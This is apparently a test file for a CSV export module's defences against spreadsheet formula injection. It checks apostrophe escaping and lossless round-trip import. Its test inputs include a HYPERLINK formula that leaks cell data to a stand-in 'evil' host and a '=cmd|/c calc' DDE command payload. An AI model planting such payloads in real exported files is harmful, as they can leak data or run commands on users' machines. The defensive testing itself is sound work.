// Pins which cells get the formula-injection escape, and which do not, so exports stay faithful.

import { describe, expect, test } from 'bun:test';
import { denormalizeCsvCell, neutralizeCsvCell, neutralizeCsvRow } from '../csv-safety';

describe('neutralizeCsvCell — escapes formula-trigger strings', () => {
  test.each([
    ['=1+1', "'=1+1"],
    ['+1', "'+1"],
    ['-1+2', "'-1+2"],
    ['@SUM(A1)', "'@SUM(A1)"],
    ['=HYPERLINK("//evil?"&A1,"x")', '\'=HYPERLINK("//evil?"&A1,"x")'],
    ['\tlead-tab', "'\tlead-tab"],
    ['\rlead-cr', "'\rlead-cr"],
  ])('prefixes %p with a single quote', (input, expected) => {
    expect(neutralizeCsvCell(input)).toBe(expected);
  });

  // A value the user typed as an apostrophe followed by a trigger gets one more apostrophe, so the
  // importer can restore it.
  test.each([
    ["'=Daily", "''=Daily"],
    ["'=mc2 rebate", "''=mc2 rebate"],
    ["'+1 driver fee", "''+1 driver fee"],
    ["'@home charge", "''@home charge"],
    ["''=already escaped", "'''=already escaped"],
  ])('escapes an apostrophe-run-then-trigger %p → %p', (input, expected) => {
    expect(neutralizeCsvCell(input)).toBe(expected);
  });
});

describe('neutralizeCsvCell — leaves safe values untouched', () => {
  test('a plain string is unchanged', () => {
    expect(neutralizeCsvCell('Shell top-up')).toBe('Shell top-up');
  });

  test('an empty string is unchanged (no spurious quote)', () => {
    expect(neutralizeCsvCell('')).toBe('');
  });

  test('a trigger char NOT in first position is inert and left alone', () => {
    expect(neutralizeCsvCell('a=b')).toBe('a=b');
    expect(neutralizeCsvCell('1-2')).toBe('1-2');
  });

  test('a leading apostrophe before a NON-trigger is left untouched (the foreign-import contract)', () => {
    expect(neutralizeCsvCell("'24 road trip")).toBe("'24 road trip");
    expect(neutralizeCsvCell("'twas the night")).toBe("'twas the night");
    expect(neutralizeCsvCell("'")).toBe("'");
  });

  test('numbers pass through with their type intact (incl. negatives)', () => {
    // A negative amount must stay numeric, not become a string.
    expect(neutralizeCsvCell(-50)).toBe(-50);
    expect(neutralizeCsvCell(52.4)).toBe(52.4);
    expect(neutralizeCsvCell(0)).toBe(0);
  });

  test('booleans / null / undefined pass through unchanged', () => {
    expect(neutralizeCsvCell(true)).toBe(true);
    expect(neutralizeCsvCell(null)).toBe(null);
    expect(neutralizeCsvCell(undefined)).toBe(undefined);
  });
});

describe('neutralizeCsvRow — guards string cells, preserves the rest', () => {
  test('only the dangerous string cells are escaped', () => {
    const out = neutralizeCsvRow({
      amount: -50,
      description: '=cmd|/c calc',
      vehicle: 'Daily Driver',
      tags: '@everyone',
      mileage: '',
    });
    expect(out).toEqual({
      amount: -50,
      description: "'=cmd|/c calc",
      vehicle: 'Daily Driver',
      tags: "'@everyone",
      mileage: '',
    });
  });

  test('returns a new object (does not mutate the input)', () => {
    const input = { description: '=evil' };
    const out = neutralizeCsvRow(input);
    expect(input.description).toBe('=evil');
    expect(out.description).toBe("'=evil");
  });
});

describe('denormalizeCsvCell — symmetric inverse for round-trip import', () => {
  test.each([
    ["'=1+1", '=1+1'],
    ["'+1", '+1'],
    ["'-1+2", '-1+2'],
    ["'@SUM(A1)", '@SUM(A1)'],
    ["'\tx", '\tx'],
    ["'\rx", '\rx'],
  ])('strips the neutralization prefix: %p → %p', (input, expected) => {
    expect(denormalizeCsvCell(input)).toBe(expected);
  });

  // A bare formula is never produced by export, so denormalize must not strip it.
  test.each(["'24 road trip", "'twas the night", 'plain text', '=not-prefixed', '', "'"])(
    'leaves a non-neutralized value untouched: %p',
    (input) => {
      expect(denormalizeCsvCell(input)).toBe(input);
    }
  );

  test('peels exactly ONE neutralization layer off an apostrophe-run-then-trigger', () => {
    expect(denormalizeCsvCell("''=double")).toBe("'=double");
    expect(denormalizeCsvCell("'''=triple")).toBe("''=triple");
  });

  test('is the exact inverse of neutralizeCsvCell for trigger strings', () => {
    for (const v of ['=evil', '+1', '-2', '@x', '\tt', '\rr']) {
      expect(denormalizeCsvCell(neutralizeCsvCell(v) as string)).toBe(v);
    }
  });

  test('is idempotent on already-clean values', () => {
    expect(denormalizeCsvCell(denormalizeCsvCell("'=x"))).toBe('=x');
  });
});

// Export followed by import restores every value exactly, including a user-typed apostrophe before
// a trigger.
describe('neutralizeCsvCell ↔ denormalizeCsvCell — lossless round-trip for every value', () => {
  test.each([
    "'=Daily",
    "'=mc2 rebate",
    "'+1 driver fee",
    "'@home charge",
    "'-5 credit",
    '=SUM(A1:A9)',
    '+1',
    '@x',
    "'24 road trip",
    "'twas the night",
    'Shell top-up',
    '-50.00 is a string here',
  ])('export→import returns the original value unchanged: %p', (original) => {
    const exported = neutralizeCsvCell(original) as string;
    expect(denormalizeCsvCell(exported)).toBe(original);
  });

  test("a `'`+trigger value is ESCAPED on export (not left bare) so import can restore it", () => {
    const userTyped = "'=Daily";
    expect(neutralizeCsvCell(userTyped)).toBe("''=Daily");
    expect(denormalizeCsvCell("''=Daily")).toBe(userTyped);
  });
});
